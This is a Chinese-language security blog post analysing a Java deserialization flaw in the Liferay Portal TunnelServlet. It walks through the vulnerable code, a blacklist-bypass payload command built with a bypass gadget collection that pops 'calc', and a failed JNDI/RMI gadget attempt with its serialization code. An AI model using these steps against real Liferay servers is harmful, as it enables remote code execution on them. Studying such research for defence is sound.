##  **前言：**

 **最近liferay
portal被爆了一个json的反序列化漏洞，本着学习的态度准备研究一番，于是搭建了低版本环境，顺手搜了下readObject函数，意外发现TunnelServlet存在java反序列化漏洞，想着马上就可以出任ceo、迎娶白富美、走上人生巅峰了，后来发现该漏洞在16年被通报官方了，只是没有给cve编号，所以一开始没搜到相关信息，只能感叹相逢恨晚了。由于该漏洞触发点比较简单，只是加了反序列化黑名单，所以下面主要讨论漏洞利用的相关技术。**

##  **一、漏洞版本**

**AffectsVersion/s** : 6.0 EE(6.0.10), 6.0 EE SP1 (6.0.11), 6.0 EE SP2
(6.0.12), 6.1 EE GA1 (6.1.10), 6.1 EEGA2 (6.1.20), 6.1 EE GA3 (6.1.30), 6.2 EE
GA1 (6.2.10), 7.0 DE (7.0.10)

**FixVersion/s** : [6.0.X
EE](https://issues.liferay.com/issues/?jql=project+%3D+LPE+AND+fixVersion+%3D+%226.0.X+EE%22),
[6.1.X
EE](https://issues.liferay.com/issues/?jql=project+%3D+LPE+AND+fixVersion+%3D+%226.1.X+EE%22),
[6.2.X
EE](https://issues.liferay.com/issues/?jql=project+%3D+LPE+AND+fixVersion+%3D+%226.2.X+EE%22),
[7.0.X
EE](https://issues.liferay.com/issues/?jql=project+%3D+LPE+AND+fixVersion+%3D+%227.0.X+EE%22)

##  **二、调试环境搭建**

首先在Idea插件中安装liferay插件

![](https://image.3001.net/images/20200411/1586578698_5e91450a554d6.png!small)

新建Liferay项目

![](https://image.3001.net/images/20200411/1586578706_5e91451229e57.png!small)

获取liferay portal，<https://releases-cdn.liferay.com/portal/>，将url改成我们需要调试的版本的路径（可能会很慢），如果你已经本地下载过了，搭个本地web服务，地址可以设置成127.0.0.1

![](https://image.3001.net/images/20200411/1586578731_5e91452bd0a30.png!small)

然后在项目中右键，liferay-IniBundle，

这一步会下载LiferayPortal，保存在项目的bundles文件夹里面

![](https://image.3001.net/images/20200411/1586578755_5e9145433e8c1.png!small)

然后添加LiferayServer就可以运行和调试项目了

![](https://image.3001.net/images/20200411/1586578769_5e914551c4119.png!small)

如果我们要拦截某个jar对数据的处理，我们需要先把jar添加到项目中，

比如我们知道webapp\root\web-inf\lib\portal-impl.jar中的com.liferay.portal.jsonwebservice.JSONWebServiceServlet类会处理所有[http://localhost:8080/api/jsonws/xxx的请求](http://localhost:8080/api/jsonws/xxx%E7%9A%84%E8%AF%B7%E6%B1%82)。

右键lib,add as library

![](https://image.3001.net/images/20200411/1586578784_5e9145606d994.png!small)定位代码，添加断点，成功断下程序。

![](https://image.3001.net/images/20200411/1586578799_5e91456fc504c.png!small)

##  **三、漏洞分析**

由于漏洞的触发比较简单，所以这里我们简单看下liferay不同版本，漏洞代码的变化。

漏洞出现在系统portal-impl.jar的TunnelServlet模块，我们看下配置文件，

    
    
    <servlet>
        <servlet-name>Tunnel Servlet</servlet-name>
         <servlet-class>com.liferay.portal.servlet.TunnelServlet</servlet-class>
        <load-on-startup>1</load-on-startup>
    </servlet>
    
    <servlet-mapping>
       <servlet-name>Tunnel Servlet</servlet-name>
       <url-pattern>/api/liferay/*</url-pattern>
    </servlet-mapping>

该模块可以直接从web访问。

**Liferay 6.x TunnelServlet代码：**

![](https://image.3001.net/images/20200411/1586578933_5e9145f5e7505.png!small)Liferay
7.0 **TunnelServlet代码：**

![](https://image.3001.net/images/20200411/1586578946_5e9146024a872.png!small)Liferay
7.1 **TunnelServlet代码：**

![](https://image.3001.net/images/20200411/1586578959_5e91460f19a77.png!small)

程序处理流程也很简单，获取http的post数据流，然后调用readObject进行反序列化。Liferay
6.x没做任何处理，直接进行反序列化，Liferay 7.0添加了反序列化黑名单，Liferay7.1需要登陆认证。

下面主要讨论Liferay 7.0中的漏洞利用。

##  **四、漏洞利用**

Liferay
6.x中利用不多赘述，直接使用[ysoserial](https://github.com/frohoff/ysoserial)生成payload打之即可。

下面我们主要讨论下Liferay
7.0的漏洞利用，即黑名单绕过。这种防御java反序列化的攻击手段还是很常见的。我们先看下，系统黑名单有那些，即那些类不允许发序列化。

>
> com.liferay.portal.kernel.io.ProtectedObjectInputStream.restricted.class.names=\
>
> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl,\
>
> org.apache.commons.collections.functors.CloneTransformer,\
>
> org.apache.commons.collections.functors.ForClosure,\
>
> org.apache.commons.collections.functors.InvokerTransformer,\
>
> org.apache.commons.collections.functors.InstantiateFactory,\
>
> org.apache.commons.collections.functors.InstantiateTransformer,\
>
>
> org.apache.commons.collections.functors.PrototypeFactory$PrototypeCloneFactory,\
>
>
> org.apache.commons.collections.functors.PrototypeFactory$PrototypeSerializationFactory,\
>
> org.apache.commons.collections.functors.WhileClosure,\
>
> org.apache.commons.collections4.functors.InvokerTransformer,\
>
> org.codehaus.groovy.runtime.ConvertedClosure,\
>
> org.codehaus.groovy.runtime.MethodClosure,\
>
> org.springframework.beans.factory.ObjectFactory,\
>
> org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider,\
>
> sun.reflect.annotation.AnnotationInvocationHandler

对于如果绕过黑名单进行反序列化，这里主要有以下四点思考，当然，仅是思考，未必能成功。

1、利用不在黑名单中的公开利用链。

这里我们可以利用[ysoserial](https://github.com/frohoff/ysoserial)的Commons
BeanUtils模块，但是CommonsBeanUtils背后使用的是com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl机制，所以直接使用也会报错，不过之前有人研究过了绕过手段，

> <https://github.com/pwntester/SerialKillerBypassGadgetCollection>

编译该项目，执行命令

    
    
    java -cp serialkiller-bypass-gadgets.jarserialkiller.Main CommonsBeanutils1 Beanutils1 "calc" >calc.ser

将payload发送到目标地址，成功弹出计算器，黑名单绕过。

基于此种方案，参考长亭的“tomcat的一种通用回显方法研究”，成功实现无外连回显任意命令执行，如果后面有时间，会单独写篇如何编写liferay反序列化任意命令执行回显的文章。

![](https://image.3001.net/images/20200411/1586579128_5e9146b8e26ed.png!small)

2、使用嵌套readObject，进行反序列化

嵌套readObject反序列化绕过，就是寻找那种在实现了readObject的类，并且readObject函数中再次调用readObject，我们可以在二次调用readObject中进行反序列化利用，不过这个要视具体场景而定，经测试该漏洞中不可行。

3、 反序列化+jndi注入实现绕过

这种方式可能不具有通用性，只是我在研究该漏洞的一个思考，或者说是学习也行。参考文章<https://www.tenable.com/security/research/tra-2017-01>，文章说，他们发现SerializableRenderedImage类中存在绕过方式，并且成功编写了poc。

于是我简单的看了下该类

    
    
    public final class SerializableRenderedImage implements RenderedImage, Serializable
    
        private void readObject(final ObjectInputStream in) throws IOException, ClassNotFoundException {
    
            this.isServer = false;
    
            this.source = null;
    
            this.serverOpen = false;
    
            this.serverSocket = null;
    
            this.serverThread = null;
    
            this.colorModel = null;
    
            in.defaultReadObject();
    
            if (this.isSourceRemote) {
    
                final String serverName = (String)in.readObject();
    
                final Long id = (Long)in.readObject();
    
                this.source = new RemoteImage(serverName + "::" + (long)id, (RenderedImage)null);
            }
    
    
            final SerializableState smState = (SerializableState)in.readObject();
    
            this.sampleModel = (SampleModel)smState.getObject();
    
            final SerializableState cmState = (SerializableState)in.readObject();
    
            this.colorModel = (ColorModel)cmState.getObject();
    
            this.properties = (Hashtable)in.readObject();
    
            if (this.useDeepCopy) {
    
                if (this.useTileCodec) {
    
                    this.imageRaster = this.decodeRasterFromByteArray((byte[])in.readObject());
    
                }
    
                else {
    
                    final SerializableState rasState = (SerializableState)in.readObject();
    
                    this.imageRaster = (Raster)rasState.getObject();
    
                }
    
            }
    
        }
    
    
     
    
    
        public RemoteImage(String serverName, final RenderedImage source) {
    
            super(null, null, null);
    
            this.id = null;
    
            this.fieldValid = new boolean[11];
    
            this.propertyNames = null;
    
            this.timeout = 1000;
    
            this.numRetries = 5;
    
            this.imageBounds = null;
    
            if (serverName == null) {
    
                serverName = this.getLocalHostAddress();
    
            }
    
            final int index = serverName.indexOf("::");
    
            final boolean remoteChainingHack = index != -1;
    
            if (!remoteChainingHack && source == null) {
    
                throw new IllegalArgumentException(JaiI18N.getString("RemoteImage1"));
    
            }
    
            if (remoteChainingHack) {
    
                this.id = Long.valueOf(serverName.substring(index + 2));
    
                serverName = serverName.substring(0, index);
    
            }
    
            this.getRMIImage(serverName);
    
            if (!remoteChainingHack) {
    
                this.getRMIID();
    
            }
    
    
            this.setRMIProperties(serverName);
    
            if (source != null) {
    
                try {
    
                    if (source instanceof Serializable) {
    
                        this.remoteImage.setSource(this.id, source);
    
                    }
    
                    else {
    
                        this.remoteImage.setSource(this.id, new SerializableRenderedImage(source));
    
                    }
    
                }
    
                catch (RemoteException e) {
    
                    throw new RuntimeException(e.getMessage());
    
                }
    
            }
        }
    
    
        private void getRMIImage(String serverName) {
    
            if (serverName == null) {
    
                serverName = this.getLocalHostAddress();
    
            }
    
            final String serviceName = new String("rmi://" + serverName + "/" + "RemoteImageServer");
    
            this.remoteImage = null;
    
            try {
    
                this.remoteImage = (RMIImage)Naming.lookup(serviceName);
    
            }
    
            catch (Exception e) {
    
                throw new RuntimeException(e.getMessage());
            }
    
        }

看到了lookup()函数，我一开始以为可以进行jndi注入呢。所以利用链如下

>
> SerializableRenderedImage->RemoteImage()->getRMIImag()->Naming.lookup(serviceName);

编写漏洞利用代码，

    
    
    public class SerializableRenderedImage 
    implements Serializable {
    
        private static final long serialVersionUID = -8499818538715956218L;
    
        private boolean isSourceRemote;
    
        public SerializableRenderedImage(){
    
            this.isSourceRemote = true;
    
        }
    
        private void writeObject(ObjectOutputStream out) throws  Exception{
    
            out.defaultWriteObject();
    
            if (this.isSourceRemote) {
    
                out.writeObject(new String("127.0.0.1:1099"));
    
                out.writeObject(new Long(1234));
    
            }
    
        }
    
    
        public static class LifeRayInvokePayload {
    
            public static void main(String[] args) throws Exception{
    
                SerializableRenderedImage
    serializableRenderedImage = new SerializableRenderedImage();
    
                String fileName = "SerializableRenderedImage.ser";
    
                FileOutputStream
    fileOutputStream = new FileOutputStream(fileName);
    
                ObjectOutputStream
    outputStream = new ObjectOutputStream(fileOutputStream);
    
                outputStream.writeObject(serializableRenderedImage);
    
                outputStream.close();
    
            }
    
        }
    
    }

将SerializableRenderedImage.ser发送到目标地址，程序流程成功走到Naming.lookup(serviceName)处，但是并没有成功出发漏洞。后经本地测试Naming.lookup()是不存在jndi注入漏洞的。

    
    
    Contextctx = new InitialContext(env);
    
    Object local_obj = ctx.lookup(serviceName);

这种才存在jndi注入。

虽然此种方案没有利用成功，但是通过调试分析，感觉自己还是进步不少。

可见<https://www.tenable.com/security/research/tra-2017-01>作者应该是利用了其他方案，目前还没有继续研究。

4、 重新寻找新的利用链

重新寻找新的利用链需要有足够扎实的技术，也比较耗时，难度较高，我这里也只是纸上谈兵，逞口舌之快。

##  **五、总结**

该漏洞触发点比较简单，利用需要动点脑筋，所以算是学习java反序列化漏洞的很好案例。如果提高自己的java反序列漏洞利用技术，还是需要学习ysoserial的代码，自己动手调试。

##  **参考：**

> <https://www.tenable.com/security/research/tra-2017-01>
>
> <https://zhuanlan.zhihu.com/p/114625962?from_voters_page=true>
>
> <https://xz.aliyun.com/t/7485>
>
> <http://www.vuln.cn/6295>

***本文作者： MrCoding，转载请注明来自FreeBuf.COM**  
  

